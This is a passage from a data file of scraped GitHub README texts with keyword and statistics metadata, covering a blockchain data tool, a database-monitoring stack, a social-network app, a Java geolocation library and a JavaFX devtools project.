",5,3,2,apache-2.0,36.0,"['build', 'world', 'largest', 'omnichain', 'data', 'network', 'chainbase', 'global', 'blockchain', 'data', 'network', 'extensive', 'dataset', 'cluster', 'worldwide', 'compare', 'chainbase', 'global', 'data', 'network', 'country', 'manuscript', 'would', 'language', 'data', 'network', 'nation', 'manuscript', 'play', 'crucial', 'role', 'chainbase', 'ecosystem', 'serving', 'bridge', 'connecting', 'various', 'data', 'service', 'user', 'manuscript', 'manuscript', 'language', 'specification', 'protocol', 'framework', 'toolkit', 'designed', 'simplify', 'unify', 'data', 'access', 'processing', 'method', 'manuscript', 'developer', 'user', 'easily', 'interact', 'vast', 'amount', 'data', 'chainbase', 'network', 'whether', 'querying', 'analyzing', 'applying', 'data', 'vision', 'manuscript', 'realize', 'data', 'trade', 'within', 'chainbase', 'network', 'establishing', 'chainbase', 'ecosystem', 'component', 'allows', 'user', 'access', 'data', 'mean', 'across', 'service', 'using', 'language', 'grand', 'vision', 'broken', 'following', 'key', 'aspect', 'language', 'hope', 'user', 'use', 'script', 'mainstream', 'programming', 'language', 'customize', 'data', 'including', 'limited', 'golang', 'rust', 'python', 'java', 'zig', 'webassembly', 'wasm', 'method', 'different', 'user', 'familiar', 'different', 'form', 'data', 'access', 'hope', 'user', 'access', 'data', 'various', 'mean', 'including', 'limited', 'sql', 'dataframes', 'http', 'grpc', 'ftp', 'webdav', 'fuse', 'data', 'user', 'able', 'access', 'data', 'format', 'json', 'csv', 'orc', 'xml', 'xlsx', 'blob', 'across', 'service', 'user', 'expected', 'data', 'storage', 'service', 'also', 'vary', 'hope', 'user', 'access', 'transfer', 'control', 'data', 'service', 'rpc', 'ipfs', 'azblob', 'hdfs', 'google', 'drive', 'bigquery', 'webdav', 'mysql', 'postgresql', 'value', 'manuscript', 'programmability', 'manuscript', 'provides', 'powerful', 'programmable', 'interface', 'allow', 'developer', 'customize', 'data', 'processing', 'workflow', 'according', 'need', 'flexibility', 'mean', 'manuscript', 'used', 'simple', 'data', 'query', 'also', 'building', 'complex', 'data', 'analysis', 'pipeline', 'application', 'programmability', 'manuscript', 'open', 'infinite', 'possibility', 'innovative', 'application', 'blockchain', 'data', 'interoperability', 'booming', 'development', 'blockchain', 'technology', 'becoming', 'increasingly', 'difficult', 'different', 'blockchains', 'understand', 'process', 'data', 'manuscript', 'solve', 'interoperability', 'problem', 'data', 'aggregation', 'dimension', 'providing', 'unified', 'interface', 'data', 'processing', 'method', 'manuscript', 'enables', 'seamless', 'integration', 'data', 'different', 'blockchains', 'greatly', 'improving', 'development', 'efficiency', 'feasibility', 'application', 'monetization', 'leveraging', 'data', 'capability', 'provided', 'manuscript', 'combined', 'architecture', 'cometbft', 'dpos', 'instant', 'transaction', 'finality', 'consensus', 'feature', 'chainbase', 'offer', 'fair', 'transparent', 'data', 'value', 'exchange', 'ecosystem', 'creator', 'monetize', 'processed', 'data', 'manuscript', 'data', 'user', 'conveniently', 'consume', 'data', 'need', 'mechanism', 'incentivizes', 'production', 'data', 'also', 'promotes', 'positive', 'development', 'entire', 'blockchain', 'ecosystem', 'videos', 'http', 'http', 'getting', 'started', 'install', 'manuscript', 'client', 'note', 'manuscript', 'data', 'trialed', 'testnet', 'locally', 'please', 'use', 'production', 'environment', 'requirements', 'docker', 'desktop', 'example', 'example', 'process', 'data', 'chainbase', 'manuscript', 'installing', 'initialize', 'manuscript', 'script', 'environment', 'using', 'command', 'init', 'use', 'client', 'initialize', 'file', 'local', 'standalone', 'container', 'environment', 'list', 'job', 'check', 'status', 'job', 'access', 'graphql', 'endpoint', 'query', 'data', 'graphql', 'http', 'deploy', 'manuscript', 'local', 'environment', 'chainbase', 'network', 'network', 'coming', 'soon', 'key', 'concept', 'two', 'primary', 'object', 'script', 'file', 'used', 'describe', 'data', 'processing', 'workflow', 'defining', 'data', 'source', 'data', 'processing', 'method', 'final', 'data', 'flow', 'direction', 'docker', 'compose', 'file', 'defines', 'local', 'container', 'cluster', 'environment', 'allowing', 'developer', 'test', 'locally', 'testing', 'deployed', 'chainbase', 'distributed', 'network', 'hood', 'start', 'default', 'stream', 'processing', 'framework', 'flink', 'cluster', 'consume', 'source', 'data', 'process', 'stream', 'data', 'using', 'defined', 'transforms', 'sink', 'processed', 'data', 'data', 'source', 'roadmap', 'planned', 'improvement', 'x', 'support', 'chainbase', 'network', 'streaming', 'lakehouse', 'x', 'support', 'flink', 'application', 'mode', 'x', 'support', 'schema', 'registry', 'support', 'function', 'udfs', 'blockchain', 'data', 'parsing', 'decoding', 'contract', 'event', 'function', 'support', 'custom', 'advanced', 'data', 'processing', 'logic', 'java', 'rust', 'apis', 'support', 'local', 'lightweight', 'environment', 'deployment', 'support', 'distributed', 'edge', 'node', 'coordinator', 'support', 'rpc', 'substream', 'data', 'processing', 'format', 'support', 'light', 'node', 'authentication', 'contributor', 'get', 'involved', 'please', 'use', 'github', 'issue', 'report', 'bug', 'suggest', 'new', 'feature', 'join', 'manuscript', 'community', 'telegram', 'vibrant', 'group', 'developer', 'data', 'engineer', 'newcomer', 'blockchain', 'data', 'learning', 'leveraging', 'manuscript', 'data', 'processing', 'follow', 'u', 'x', 'share', 'latest', 'tutorial', 'forthcoming', 'community', 'event', 'occasional', 'meme', 'question', 'feedback', 'write', 'u', 'support', 'license', 'licensed', 'apache', 'license', 'view', 'copy', 'license', 'file']","['data', 'manuscript', 'chainbase', 'network', 'user']",2,0,0,"['build', 'the', 'world', 'largest', 'omnichain', 'data', 'network', 'manuscript', 'value', 'manuscript', 'video', 'get', 'start', 'install', 'manuscript', 'client', 'for', 'linux', 'macos', 'requirement', 'example', 'after', 'instal', 'initialize', 'manuscript', 'script', 'environment', 'use', 'command', 'init', 'use', 'client', 'initialize', 'file', 'local', 'standalone', 'container', 'environment', 'list', 'job', 'check', 'status', 'job', 'access', 'graphql', 'endpoint', 'query', 'data', 'graphql', 'http', 'deploy', 'manuscript', 'local', 'environment', 'chainbase', 'network', 'the', 'network', 'come', 'soon', 'cat', 'file', 'vim', 'file', 'deploy', 'manuscript', 'local', 'environment', 'key', 'concept', 'roadmap', 'contributor', 'get', 'involved', 'license']",22,"['manuscript', 'environment', 'network', 'file', 'local']",5,0.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin,org.eclipse.m2e:lifecycle-mapping]",0.0,1.0,0.0,12979,26.861538461538466,5.285223367697594,"['![GitHub Version -> https://img.shields.io/github/tag-pre/chainbase-labs/manuscript-core?label=Version&color=D4B68C', 'PyPI License -> https://img.shields.io/pypi/l/quixstreams?label=Licence&color=D4B68C', '![Docs -> https://img.shields.io/badge/docs-chainbase.com-0345b2?label=Docs&color=D4B68C', '![Tests on Linux, MacOS and Windows -> https://github.com/chainbase-labs/manuscript-core/actions/workflows/test.yml/badge.svg', '![Go Report Card -> https://goreportcard.com/badge/github.com/chainbase-labs/manuscript-core', '![X -> https://img.shields.io/twitter/url?&color=D4B68C&label=&style=social&url=https%3A%2F%2Fx.com%2FchainbaseHQ', '![Discord -> https://img.shields.io/badge/Chainbase-0345b2?logo=Discord', '![Telegram -> https://img.shields.io/badge/Chainbase-0345b2?logo=Telegram', 'Docker Desktop 25.1+ -> https://www.docker.com/products/docker-desktop/', 'GitHub issues -> https://github.com/chainbase-labs/manuscript-core/issues', 'Manuscript Community On Telegram -> https://t.me/ChainbaseNetwork', 'X -> https://x.com/chainbaseHQ', 'here -> https://github.com/chainbase-labs/manuscript-core/blob/main/LICENSE', 'command', 'flags', 'demo', 'x', 'x', 'x', ' ', ' ', ' ', ' ', ' ', ' ']",25
Anyel-ec/SecurityMonitoring,main,"# Open Source Tool for Monitoring MariaDB, PostgreSQL, and MongoDB Databases Using Prometheus and Grafana

This project aims to develop an open-source tool for dynamic monitoring of three databases: **MongoDB**, **PostgreSQL**, and **MariaDB/MySQL**. The tool allows users to specify connection credentials through a web interface in **React** and, subsequently, visualize custom dashboards in **Grafana** for one or several databases combined.

The backend is built with **Spring Boot** and uses **Prometheus** and **Grafana** to collect and visualize the selected database metrics.

## Project Status

This project is under development. So far, the following has been implemented:
- A **React** interface for entering database connection credentials.
- Integration of **Docker Compose** with services for Grafana, Prometheus, and exporters for **PostgreSQL**, **MongoDB**, and **MariaDB**.
- Initial monitoring and visualization configuration in **Grafana**.

## Technologies Used

- **Frontend**: React (created with Vite), React Bootstrap for designing dynamic forms.
- **Backend**: Spring Boot (under development).
- **Monitoring and Visualization**: Grafana and Prometheus.
- **Databases**: MongoDB, PostgreSQL, and MariaDB.
- **Containers**: Docker and Docker Compose for service orchestration.

## Features

1. **Database Connection Configuration**:
    - Users can specify credentials to connect to **MongoDB**, **PostgreSQL**, and **MariaDB** via a dynamic form in the React app.
    - Allows for combinations of different databases: for example, monitoring only **MongoDB**, **PostgreSQL**, or **MariaDB**, or combinations like **MongoDB+PostgreSQL**.

2. **Dynamic Monitoring**:
    - The **Spring Boot** backend receives the credentials provided by the user and configures the database connections.
    - Metrics are collected using **Prometheus** and visualized through **Grafana**.

3. **Visualization in Grafana**:
    - Preconfigured dashboards in **Grafana** that are activated based on the databases selected by the user.

## Docker Compose Configuration (`docker-compose.yml`)

The `docker-compose.yml` file is configured to start the necessary services for monitoring the databases and visualizing them in Grafana. Below is the current configuration:

```yaml
version: '3'

services:
  grafana:
    image: grafana/grafana
    ports:
      - ""${GRAFANA_PORT_EXTERNAL}:${GRAFANA_PORT_INTERNAL}""
    environment:
      GF_SECURITY_ADMIN_USER: ""${GRAFANA_USER}""
      GF_SECURITY_ADMIN_PASSWORD: ""${GRAFANA_PASSWORD}""
    volumes:
      - grafana_storage:/var/lib/grafana
    networks:
      - monitoring

  prometheus:
    image: prom/prometheus
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml:ro 
    ports:
      - ""${PROMETHEUS_PORT_EXTERNAL}:${PROMETHEUS_PORT_INTERNAL}""
    networks:
      - monitoring

  postgres-exporter:
    image: quay.io/prometheuscommunity/postgres-exporter
    environment:
      DATA_SOURCE_NAME: ""postgresql://${POSTGRES_USER}:${POSTGRES_PASSWORD}@${POSTGRES_HOST}:${POSTGRES_PORT}?sslmode=disable""
    ports:
      - ""${EXPORT_POSTGRES_PORT_EXTERNAL}:${EXPORT_POSTGRES_PORT_INTERNAL}""
    networks:
      - monitoring

networks:
  monitoring:
    driver: bridge

volumes:
  grafana_storage:
```

This `docker-compose.yml` file configures and exposes the **Grafana**, **Prometheus**, and **Postgres Exporter** services. Ensure that the environment variables (`GRAFANA_USER`, `GRAFANA_PASSWORD`, `POSTGRES_USER`, `POSTGRES_PASSWORD`, etc.) are properly defined in your environment or `.env` file.

## Prometheus Configuration (`prometheus.yml`)

The `prometheus.yml` file is configured to monitor services for MongoDB, PostgreSQL, and MariaDB through their respective exporters.

```yaml
global:
  scrape_interval: 5s

scrape_configs:
  - job_name: 'prometheus'
    static_configs:
      - targets: ['prometheus:9090']

  - job_name: 'postgres'
    static_configs:
      - targets: ['postgres-exporter:9187']
```

## Installation and Usage

### 1. Clone the Repository

```bash
git clone https://github.com/Anyel-ec/SecurityMonitoring
cd SecurityMonitoring
```

### 2. Run the Services with Docker Compose

```bash
docker-compose up -d
```

This will launch the following services:
- **Grafana**: Accessible at `http://localhost:3000` (username: `admin`, password: `admin`).
- **Prometheus**: Accessible at `http://localhost:9090`.
- **PostgreSQL Exporter**: Accessible at `http://localhost:9187`.

### 3. Configure Grafana

1. Access **Grafana** at `http://localhost:3000`.
2. Log in using the credentials (`admin/admin`).
3. Add **Prometheus** as a data source:
   - URL: `http://prometheus:9090`.
4. Import the relevant dashboard to visualize the metrics for the configured databases.

### 4. Next Steps

The next step in development is to improve the integration with the databases, as well as automate the creation of dashboards in Grafana.

## Contributions

If you wish to contribute to this project, please open an issue or submit a pull request.

## License

This project is licensed under the [Apache License 2.0](LICENSE).

## Team and Project Information

Open source tool service for dynamic monitoring of three DBMS: MongoDB, PostgreSQL, and MariaDB/MySQL.

**Project Manager: Ing. Luis Chica, Mgtr** - [GitHub Profile](https://github.com/LuisChica18)

**Developer: Ing. Angel Patiño** - [GitHub Profile](https://github.com/Anyel-ec)",1,2,4,apache-2.0,0.0,"['open', 'source', 'tool', 'monitoring', 'mariadb', 'postgresql', 'mongodb', 'database', 'using', 'prometheus', 'grafana', 'project', 'aim', 'develop', 'tool', 'dynamic', 'monitoring', 'three', 'database', 'mongodb', 'postgresql', 'tool', 'allows', 'user', 'specify', 'connection', 'credential', 'web', 'interface', 'react', 'subsequently', 'visualize', 'custom', 'dashboard', 'grafana', 'one', 'several', 'database', 'combined', 'backend', 'built', 'spring', 'boot', 'us', 'prometheus', 'grafana', 'collect', 'visualize', 'selected', 'database', 'metric', 'project', 'status', 'project', 'development', 'far', 'following', 'implemented', 'react', 'interface', 'entering', 'database', 'connection', 'credential', 'integration', 'docker', 'compose', 'service', 'grafana', 'prometheus', 'exporter', 'postgresql', 'mongodb', 'mariadb', 'initial', 'monitoring', 'visualization', 'configuration', 'grafana', 'technology', 'used', 'frontend', 'react', 'created', 'vite', 'react', 'bootstrap', 'designing', 'dynamic', 'form', 'backend', 'spring', 'boot', 'development', 'monitoring', 'visualization', 'grafana', 'prometheus', 'database', 'mongodb', 'postgresql', 'mariadb', 'container', 'docker', 'docker', 'compose', 'service', 'orchestration', 'feature', 'database', 'connection', 'configuration', 'user', 'specify', 'credential', 'connect', 'mongodb', 'postgresql', 'mariadb', 'via', 'dynamic', 'form', 'react', 'app', 'allows', 'combination', 'different', 'database', 'example', 'monitoring', 'mongodb', 'postgresql', 'mariadb', 'combination', 'like', 'dynamic', 'monitoring', 'spring', 'boot', 'backend', 'receives', 'credential', 'provided', 'user', 'configures', 'database', 'connection', 'metric', 'collected', 'using', 'prometheus', 'visualized', 'grafana', 'visualization', 'grafana', 'preconfigured', 'dashboard', 'grafana', 'activated', 'based', 'database', 'selected', 'user', 'docker', 'compose', 'configuration', 'file', 'configured', 'start', 'necessary', 'service', 'monitoring', 'database', 'visualizing', 'grafana', 'current', 'configuration', 'file', 'configures', 'expose', 'grafana', 'prometheus', 'postgres', 'exporter', 'service', 'ensure', 'environment', 'variable', 'etc', 'properly', 'defined', 'environment', 'file', 'prometheus', 'configuration', 'file', 'configured', 'monitor', 'service', 'mongodb', 'postgresql', 'mariadb', 'respective', 'exporter', 'installation', 'usage', 'clone', 'repository', 'run', 'service', 'docker', 'compose', 'launch', 'following', 'service', 'grafana', 'accessible', 'username', 'password', 'prometheus', 'accessible', 'postgresql', 'exporter', 'accessible', 'configure', 'grafana', 'access', 'grafana', 'log', 'using', 'credential', 'add', 'prometheus', 'data', 'source', 'url', 'import', 'relevant', 'dashboard', 'visualize', 'metric', 'configured', 'database', 'next', 'step', 'next', 'step', 'development', 'improve', 'integration', 'database', 'well', 'automate', 'creation', 'dashboard', 'grafana', 'contribution', 'wish', 'contribute', 'project', 'please', 'open', 'issue', 'submit', 'pull', 'request', 'license', 'project', 'licensed', 'apache', 'license', 'team', 'project', 'information', 'open', 'source', 'tool', 'service', 'dynamic', 'monitoring', 'three', 'dbms', 'mongodb', 'postgresql', 'project', 'manager', 'ing', 'luis', 'chica', 'mgtr', 'github', 'profile', 'developer', 'ing', 'angel', 'github', 'profile']","['grafana', 'database', 'postgresql', 'prometheus', 'monitoring']",1,0,0,"['open', 'source', 'tool', 'monitoring', 'mariadb', 'postgresql', 'mongodb', 'database', 'using', 'prometheus', 'grafana', 'project', 'status', 'technology', 'use', 'feature', 'docker', 'compose', 'configuration', 'prometheus', 'configuration', 'installation', 'usage', 'clone', 'repository', 'run', 'service', 'docker', 'compose', 'configure', 'grafana', 'next', 'step', 'contribution', 'license', 'team', 'project', 'information']",14,"['prometheus', 'grafana', 'project', 'docker', 'compose']",4,0.0,1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0,5417,13.319148936170214,6.354632587859425,"['GitHub Profile -> https://github.com/LuisChica18', 'GitHub Profile -> https://github.com/Anyel-ec']",2
ngud-119/Social-Network,master,"# Social-Network

Social-Network is a Stateful app built with [Spring Boot](http://spring.io/projects/spring-boot), [MySQL](https://www.mysql.com/) and [React](https://reactjs.org/).

Features:
- Routing
- User authentication: Register/Login/Logout
- 3 User Roles: Root, Admin and User
- Promoting/Demoting users to Admin/User
- Creating and deleting users
- Editing user profile
- Searching for friends
- Sending and accepting friend requests
- Removing friends from the friends list
- Adding and deleting photos
- Creating and deleting posts
- Creating and deleting comments
- Chat functionality: writing and receiving messages from your friends
- Logs history

The project is deployed on [Heroku](https://social-network-kl.herokuapp.com/).

**Admin Credentials:**
- username: john
- password: 1111

## Requirements

1. Java 11

2. In order to be able to save `Photos` you need to sign up to [Cloudinary](https://cloudinary.com/) and enter your credentials in the `application.properties` file of the Spring Boot app (`SocialNetwork\Server\src\main\resources\application.properties`)

## Start the app

### **Option 1 - Start the Client and the Server manually**

#### 1. Start the Client

To start the Client you need to enter the `SocialNetwork/Client` folder:

```bash
$ cd SocialNetwork/Client
```

Install all dependencies:

```bash
$ npm install
```

Run the app in the development mode:

```bash
$ npm start
```

Open [http://localhost:3000](http://localhost:3000) to view it in the browser.

#### 2. Start the Server

Go to the root directory of the Spring Boot app:

```bash
$ cd SocialNetwork/Server
```

Start the Server:

```bash
$ mvn spring-boot:run
```
The Server is running on port `8000`.


### **Option 2 - Start the application in Docker**

1. **Start the application**

Go to the project directory( `SocialNetwork/` ) and run:

```bash
$ docker-compose up -d
```

The front-end server will start on port `9090`. To open it enter in your browser:

```bash
$ http://localhost:9090
```
2. **Stop the application**

You can stop the containers with:

 ```bash 
 $ docker-compose down
 ```

## App screenshots

1. **Home Page**

 ![App Screenshot](readme-images/kl-social-network-home-gregor.PNG)

2. **Friends Page**

 ![App Screenshot](readme-images/kl-social-network-friends-gregor.PNG)

3. **Photos Page**

 ![App Screenshot](readme-images/kl-social-network-photos-gregor.PNG)
",0,0,1,mit,0.0,"['stateful', 'app', 'built', 'spring', 'boot', 'mysql', 'react', 'feature', 'routing', 'user', 'authentication', 'user', 'roles', 'root', 'admin', 'user', 'user', 'creating', 'deleting', 'user', 'editing', 'user', 'profile', 'searching', 'friend', 'sending', 'accepting', 'friend', 'request', 'removing', 'friend', 'friend', 'list', 'adding', 'deleting', 'photo', 'creating', 'deleting', 'post', 'creating', 'deleting', 'comment', 'chat', 'functionality', 'writing', 'receiving', 'message', 'friend', 'log', 'history', 'project', 'deployed', 'heroku', 'admin', 'credential', 'username', 'john', 'password', 'requirements', 'java', 'order', 'able', 'save', 'need', 'sign', 'cloudinary', 'enter', 'credential', 'file', 'spring', 'boot', 'app', 'start', 'app', 'option', 'start', 'client', 'server', 'manually', 'start', 'client', 'start', 'client', 'need', 'enter', 'folder', 'install', 'dependency', 'run', 'app', 'development', 'mode', 'open', 'http', 'view', 'browser', 'start', 'server', 'go', 'root', 'directory', 'spring', 'boot', 'app', 'start', 'server', 'server', 'running', 'port', 'option', 'start', 'application', 'docker', 'start', 'application', 'go', 'project', 'directory', 'run', 'server', 'start', 'port', 'open', 'enter', 'browser', 'stop', 'application', 'stop', 'container', 'app', 'screenshots', 'home', 'page', 'friend', 'page', 'photo', 'page']","['start', 'app', 'user', 'friend', 'server']",0,0,0,"['requirement', 'start', 'app', 'option', 'start', 'client', 'server', 'manually', 'start', 'client', 'start', 'server', 'option', 'start', 'application', 'docker', 'app', 'screenshots']",8,"['start', 'app', 'option', 'client', 'server']",8,1.0,1.0,"[maven-resources-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0,2398,19.27777777777778,5.0,"['Spring Boot -> http://spring.io/projects/spring-boot', 'MySQL -> https://www.mysql.com/', 'React -> https://reactjs.org/', 'Heroku -> https://social-network-kl.herokuapp.com/', 'Cloudinary -> https://cloudinary.com/', 'http://localhost:3000 -> http://localhost:3000']",6
tomaytotomato/location4j,master,"# location4j 🌎4️⃣♨️

![GitHub branch check runs](https://img.shields.io/github/check-runs/tomaytotomato/location4j/master)
[![Bugs](https://sonarcloud.io/api/project_badges/measure?project=tomaytotomato_location4j&metric=bugs)](https://sonarcloud.io/summary/new_code?id=tomaytotomato_location4j)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=tomaytotomato_location4j&metric=alert_status)](https://sonarcloud.io/summary/new_code?id=tomaytotomato_location4j)
[![javadoc](https://javadoc.io/badge2/com.tomaytotomato/location4j/1.0.3/javadoc.svg)](https://javadoc.io/doc/com.tomaytotomato/location4j/1.0.3)
![GitHub commit activity](https://img.shields.io/github/commit-activity/m/tomaytotomato/location4j)
![GitHub License](https://img.shields.io/github/license/tomaytotomato/location4j)

location4j is a simple Java library designed for efficient and accurate geographical data lookups
for countries, states, and cities. 🗺️

Unlike other libraries, it operates without relying on third-party APIs, making it both
cost-effective and fast. 🏎️

Its built-in dataset provides quick lookups and no need for external HTTP calls. 📀

## Setup 🚀

Get the latest version of the location4j library by adding it to your Maven pom.xml

```xml

<dependency>
    <groupId>com.tomaytotomato</groupId>
    <artifactId>location4j</artifactId>
    <version>1.0.5</version>
</dependency>
```

**Gradle**

```gradle
implementation group: 'com.tomaytotomato', name: 'location4j', version: '1.0.5'
```

## Quick Example 🏗

```java
import com.tomaytotomato.SearchLocationService;

public class Main {

    public static void main(String[] args) {
        SearchLocationService searchLocationService = SearchLocationService.builder().build();

        // Find all locations named San Francisco
        List<Location> results = searchLocationService.search(""san francisco"");
        printResults(results);

        // Narrow search to the US
        results = searchLocationService.search(""san francisco, us"");
        printResults(results);

        // Narrow search further to California
        results = searchLocationService.search(""san francisco, us california"");
        printResults(results);
    }

    private static void printResults(List<Location> results) {
        System.out.println(""Locations found: "" + results.size());
        results.forEach(location -> {
            System.out.println(""Country: "" + location.getCountryName());
            System.out.println(""State: "" + location.getStateName());
            System.out.println(""City: "" + location.getCityName());
        });
    }
}

```

## Features 🔬

| Feature                         | Supported | Object   | Example                                                                         |
|---------------------------------|-----------|----------|---------------------------------------------------------------------------------|
| Search (free text)              | ✅         | Location | `search(""kyiv"")` -> `""Kyiv, Ukraine, Europe, UA""`                               |
| Find All Countries              | ✅         | Country  | `findAllCountries()` -> `[""Belgium"", ""Canada"", ...]`                            |
| Find Country by Id              | ✅         | Country  | `findCountryById(1)` -> `[""Afghanistan""]`                                       |
| Find Country by ISO2 code       | ✅         | Country  | `findCountryByISO2Code(""CA"")` -> `[""Canada""]`                                   |
| Find Country by ISO3 code       | ✅         | Country  | `findCountryByISO3Code(""CAN"")` -> `[""Canada""]`                                  |
| Find Country by Name            | ✅         | Country  | `findCountryByName(""Canada"")` -> `[""Canada""]`                                   |
| Find Country by Localised name  | ✅         | Country  | `findCountryByLocalisedName(""Belgique"")` -> `[""Belgium""]`                       |
| Find Countries by State name    | ✅         | Country  | `findAllCountriesByStateName(""Texas"")` -> `[""USA""]`                             |
| Find States by State name       | ✅         | State    | `findAllStatesByStateName(""Texas"")` -> `[""Texas"", ""USA""]`                       |
| Find State by State Id          | ✅         | State    | `findStateById(5)` -> `[""California"", ""USA""]`                                   |
| Find States by State code       | ✅         | State    | `findAllStatesByStateCode(""CA"")` -> `[""California"", ""USA""]`                     |
| Find City by City Id            | ✅         | City     | `findCityById(10)` -> `[""Los Angeles"", ""California""]`                           |
| Find City by latitude/longitude | ✅         | City     | `findClosestCityByLatLong(30.438, -84.280)` -> `[""Tallahassee"", ""Florida""]`     |
| Find Cities by City name        | ✅         | City     | `findAllCitiesByCityName(""San Francisco"")` -> `[""San Francisco"", ""California""]` |

🟢 location4j can parse free text strings with or without punctuation or capitalisation e.g.
> San Francisco, CA, USA
>
> ca united states san francisco
>
> US, San Francisco, california

🟢 Latitude/Longitude searches can use `double`, `BigDecimal`, or `String` inputs for both values;
the types must match (
you can't mix a `String` latitude with a `BigDecimal` or `double` longitude) but the API will accept
any of the three
types.

🔴 location4j cannot find a location based on a small town, street, or
zipcode/postcode.

## More Examples 🧪

**Lookup countries**

For simple lookups the `LocationService` can act like a repository, allow the retrieval of
countries, states and city information.

```java

import com.tomaytotomato.LocationService;

public class LocationServiceExample {

    public static void main(String[] args) {
        LocationService locationService = LocationService.builder().build();

        // Get all countries
        List<Country> countries = locationService.findAllCountries();

        // Filter European countries
        List<Country> europeanCountries = countries.stream()
                .filter(country -> ""Europe"".equals(country.getRegion()))
                .toList();

        // Find Afghanistan by ID
        Country afghanistan = locationService.findCountryById(1);

        // Find all cities named San Francisco
        List<City> cities = locationService.findAllCities(""San Francisco"");

    }
}

```

**Search locations**

Search any text for a location, the `SearchLocationService` can handle formatted or unformatted
text. It will try and find matches against a variety of keywords it has in its dataset.

```java

import com.tomaytotomato.SearchLocationService;

public class SearchLocationServiceExample {

    public static void main(String[] args) {
        SearchLocationService searchLocationService = SearchLocationService.builder()
            .withTextNormaliser(new DefaultTextNormaliser())
            .build();

        // Search for Santa Clara
        List<Location> results = searchLocationService.search(""Santa Clara"");

        // Search for Santa Clara in the USA
        List<Location> resultsUnitedStates = searchLocationService.search(""Santa Clara USA"");

        // Search for Santa Clara in California (it works with ISO2 or ISO3) codes
        List<Location> resultsCalifornia = searchLocationService.search(""Santa Clara US CA"");
    }
}

```

## Motivation 🌱

Parsing location data efficiently is crucial for many applications, yet it can be complex and
time-consuming.

Third-party services like Google Location API can be costly, and using large language models can
introduce significant latency.

location4j offers a practical solution with its own dataset, enabling fast and cost-effective
geographical lookups to a city/town level (which is sufficient in most cases).

This allows applications to be built without another external dependency and the overheads that come
with it.

I may add other functionality in the future if needed e.g. geolocation to nearest place, geofencing
etc.

## Credits 🙏

Country data sourced
from [dr5shn/countries-states-cities-database](https://github.com/dr5hn/countries-states-cities-database) [![License: ODbL](https://img.shields.io/badge/License-ODbL-brightgreen.svg)](https://opendatacommons.org/licenses/odbl/)

## License 📜

[MIT License](https://choosealicense.com/licenses/mit/)

",6,4,3,mit,15.0,"['simple', 'java', 'library', 'designed', 'efficient', 'accurate', 'geographical', 'data', 'lookup', 'country', 'state', 'city', 'unlike', 'library', 'operates', 'without', 'relying', 'apis', 'making', 'fast', 'dataset', 'provides', 'quick', 'lookup', 'need', 'external', 'http', 'call', 'setup', 'get', 'latest', 'version', 'library', 'adding', 'maven', 'gradle', 'quick', 'example', 'feature', 'feature', 'supported', 'object', 'example', 'search', 'free', 'text', 'location', 'find', 'country', 'country', 'find', 'country', 'id', 'country', 'find', 'country', 'code', 'country', 'find', 'country', 'code', 'country', 'find', 'country', 'name', 'country', 'find', 'country', 'localised', 'name', 'country', 'find', 'country', 'state', 'name', 'country', 'find', 'state', 'state', 'name', 'state', 'find', 'state', 'state', 'id', 'state', 'find', 'state', 'state', 'code', 'state', 'find', 'city', 'city', 'id', 'city', 'find', 'city', 'city', 'find', 'city', 'city', 'name', 'city', 'parse', 'free', 'text', 'string', 'without', 'punctuation', 'capitalisation', 'san', 'francisco', 'ca', 'usa', 'ca', 'united', 'state', 'san', 'francisco', 'u', 'san', 'francisco', 'california', 'search', 'use', 'input', 'value', 'type', 'must', 'match', 'ca', 'mix', 'latitude', 'longitude', 'api', 'accept', 'three', 'type', 'find', 'location', 'based', 'small', 'town', 'street', 'example', 'lookup', 'country', 'simple', 'lookup', 'act', 'like', 'repository', 'allow', 'retrieval', 'country', 'state', 'city', 'information', 'search', 'location', 'search', 'text', 'location', 'handle', 'formatted', 'unformatted', 'text', 'try', 'find', 'match', 'variety', 'keywords', 'dataset', 'motivation', 'parsing', 'location', 'data', 'efficiently', 'crucial', 'many', 'application', 'yet', 'complex', 'service', 'like', 'google', 'location', 'api', 'costly', 'using', 'large', 'language', 'model', 'introduce', 'significant', 'latency', 'offer', 'practical', 'solution', 'dataset', 'enabling', 'fast', 'geographical', 'lookup', 'level', 'sufficient', 'case', 'allows', 'application', 'built', 'without', 'another', 'external', 'dependency', 'overhead', 'come', 'may', 'add', 'functionality', 'future', 'needed', 'geolocation', 'nearest', 'place', 'geofencing', 'etc', 'credit', 'country', 'data', 'sourced', 'license', 'mit', 'license']","['country', 'find', 'state', 'city', 'location']",5,0,0,"['setup', 'quick', 'example', 'feature', 'more', 'example', 'motivation', 'credit', 'license']",8,"['example', 'setup', 'quick', 'feature', 'more']",5,72.0,3.0,"[com.diffplug.spotless:spotless-maven-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.jacoco:jacoco-maven-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,2.0,1.0,8290,36.69565217391305,6.26303317535545,"['GitHub branch check runs -> https://img.shields.io/github/check-runs/tomaytotomato/location4j/master', '![Bugs -> https://sonarcloud.io/api/project_badges/measure?project=tomaytotomato_location4j&metric=bugs', '![Quality Gate Status -> https://sonarcloud.io/api/project_badges/measure?project=tomaytotomato_location4j&metric=alert_status', '![javadoc -> https://javadoc.io/badge2/com.tomaytotomato/location4j/1.0.3/javadoc.svg', 'GitHub commit activity -> https://img.shields.io/github/commit-activity/m/tomaytotomato/location4j', 'GitHub License -> https://img.shields.io/github/license/tomaytotomato/location4j', 'dr5shn/countries-states-cities-database -> https://github.com/dr5hn/countries-states-cities-database', '![License: ODbL -> https://img.shields.io/badge/License-ODbL-brightgreen.svg', 'MIT License -> https://choosealicense.com/licenses/mit/']",9
mkpaz/devtoolsfx,master,"# devtoolsfx

DevToolsFX is a tool for navigating your application's scene graph and exploring node properties. It aims to be similar
to Chrome DevTools, but for JavaFX.

It's lightweight, around 250 KB, with no dependencies, allowing you to easily embed it into your app. The only JavaFX
dependency is `javafx.controls`, which your app will need regardless.

